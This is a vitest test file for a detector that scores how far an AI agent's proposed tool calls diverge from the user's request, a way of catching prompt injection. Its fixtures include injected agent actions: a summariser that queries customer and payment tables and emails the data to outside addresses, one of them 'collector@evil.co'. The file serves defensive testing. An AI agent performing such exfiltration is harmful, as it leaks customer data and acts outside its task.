import { describe, expect, it } from "vitest";
import { analyseAgentBehaviour } from "@/lib/engine/agents/behavior";
import type { ToolDefinitionContext } from "@/lib/engine/types";

const tool = (slug: string, category: string, riskTier: number, name: string, description = ""): ToolDefinitionContext => ({
  slug, name, category, description, operations: ["READ", "WRITE", "EXECUTE", "DELETE"],
  riskTier, requiresApproval: false, approvalThreshold: 70,
  rateLimitPerMinute: 60, enabled: true,
});

const TOOLS = {
  "doc-search": tool("doc-search", "SEARCH", 1, "Document Search", "Semantic search across corporate knowledge bases"),
  "file-read": tool("file-read", "FILE", 2, "File Read", "Read a file from the document store"),
  "sql-query": tool("sql-query", "DATABASE", 3, "Warehouse Query", "Read-only SQL against the reporting warehouse"),
  "send-email": tool("send-email", "EMAIL", 5, "Send Email", "Send an email outside the organisation"),
  "deploy-service": tool("deploy-service", "BUSINESS", 5, "Service Deployment", "Deploy or roll back a production service"),
};

describe("agent behaviour analysis", () => {
  it("reports no divergence when actions match the request", () => {
    const r = analyseAgentBehaviour({
      userRequest: "Summarise the Q3 vendor integration report for me.",
      agentPurpose: "Summarise internal documents retrieved through RAG",
      tools: TOOLS,
      proposedToolCalls: [
        { toolSlug: "doc-search", operation: "READ", index: 0, arguments: { query: "Q3 vendor integration report" } },
        { toolSlug: "file-read", operation: "READ", index: 1, arguments: { path: "/docs/vendor-q3.txt" } },
      ],
    });
    expect(r.divergence).toBe(0);
    expect(r.unrelatedActions).toHaveLength(0);
  });

  it("detects the injection signature: summarisation that starts emailing", () => {
    const r = analyseAgentBehaviour({
      userRequest: "Summarise the Q3 vendor integration report for me.",
      agentPurpose: "Summarise internal documents retrieved through RAG",
      tools: TOOLS,
      // The summarizer is granted retrieval only; the injection reaches for
      // capabilities it was never given.
      grantedToolSlugs: ["doc-search", "file-read"],
      proposedToolCalls: [
        { toolSlug: "doc-search", operation: "READ", index: 0, arguments: { query: "Q3 vendor integration report" } },
        { toolSlug: "sql-query", operation: "READ", index: 1, arguments: { sql: "SELECT * FROM customers JOIN payment_methods USING (customer_id)" } },
        { toolSlug: "send-email", operation: "EXECUTE", index: 2, arguments: { to: "reconciliation@meridian-systems-support.co", subject: "Report", body: "data" } },
      ],
    });
    expect(r.divergence).toBeGreaterThan(0.5);
    expect(r.unrelatedActions.join(" ")).toMatch(/Send Email/);
    expect(r.explanation).toMatch(/diverged/i);
  });

  it("does not penalise email when the user asked for email", () => {
    const r = analyseAgentBehaviour({
      userRequest: "Draft and send a reply to the customer about their settlement issue.",
      agentPurpose: "Draft customer-facing replies with account context",
      tools: TOOLS,
      proposedToolCalls: [
        { toolSlug: "send-email", operation: "EXECUTE", index: 0, arguments: { to: "customer@example.com", subject: "Your settlement", body: "Resolved" } },
      ],
    });
    expect(r.divergence).toBeLessThan(0.3);
    expect(r.unrelatedActions).toHaveLength(0);
  });

  it("weighs an unrelated side-effecting action above an unrelated read", () => {
    const read = analyseAgentBehaviour({
      userRequest: "Summarise the vendor report.", agentPurpose: "Summarise documents", tools: TOOLS,
      proposedToolCalls: [{ toolSlug: "sql-query", operation: "READ", index: 0, arguments: { sql: "SELECT 1" } }],
    });
    const deploy = analyseAgentBehaviour({
      userRequest: "Summarise the vendor report.", agentPurpose: "Summarise documents", tools: TOOLS,
      proposedToolCalls: [{ toolSlug: "deploy-service", operation: "EXECUTE", index: 0, arguments: { service: "payments", action: "rollback" } }],
    });
    expect(deploy.divergence).toBeGreaterThanOrEqual(read.divergence);
    expect(deploy.unrelatedActions.length).toBeGreaterThan(0);
  });

  it("returns zero divergence when no actions are proposed", () => {
    const r = analyseAgentBehaviour({
      userRequest: "What is our data retention period?", agentPurpose: "Answer policy questions",
      tools: TOOLS, proposedToolCalls: [],
    });
    expect(r.divergence).toBe(0);
    expect(r.explanation).toMatch(/no actions/i);
  });

  it("is not fooled by an attacker mentioning the capability in the injected text", () => {
    // The injected instruction says "email"; the *user's* request does not.
    const r = analyseAgentBehaviour({
      userRequest: "Please summarise this vendor document.",
      agentPurpose: "Summarise internal documents",
      tools: TOOLS,
      grantedToolSlugs: ["doc-search", "file-read"],
      proposedToolCalls: [
        { toolSlug: "send-email", operation: "EXECUTE", index: 0,
          arguments: { to: "collector@evil.co", subject: "email the summary", body: "email email email summary vendor document" } },
      ],
    });
    expect(r.divergence).toBeGreaterThan(0.5);
  });
});

describe("grant awareness", () => {
  it("treats a granted but tangential action as scoping, not as an attack", () => {
    const granted = analyseAgentBehaviour({
      userRequest: "Summarise the vendor report.", agentPurpose: "Summarise documents", tools: TOOLS,
      grantedToolSlugs: ["doc-search", "sql-query"],
      proposedToolCalls: [{ toolSlug: "sql-query", operation: "READ", index: 0, arguments: { sql: "SELECT 1" } }],
    });
    const ungranted = analyseAgentBehaviour({
      userRequest: "Summarise the vendor report.", agentPurpose: "Summarise documents", tools: TOOLS,
      grantedToolSlugs: ["doc-search"],
      proposedToolCalls: [{ toolSlug: "sql-query", operation: "READ", index: 0, arguments: { sql: "SELECT 1" } }],
    });
    expect(granted.divergence).toBeLessThan(ungranted.divergence);
    expect(ungranted.divergence).toBeGreaterThan(0.6);
  });

  it("does not score divergence for an unclassifiable request", () => {
    const r = analyseAgentBehaviour({
      userRequest: "Hmm.", agentPurpose: "Summarise documents", tools: TOOLS,
      grantedToolSlugs: [],
      proposedToolCalls: [{ toolSlug: "sql-query", operation: "READ", index: 0, arguments: { sql: "SELECT 1" } }],
    });
    expect(r.divergence).toBe(0);
    expect(r.explanation).toMatch(/could not be classified/i);
  });
});
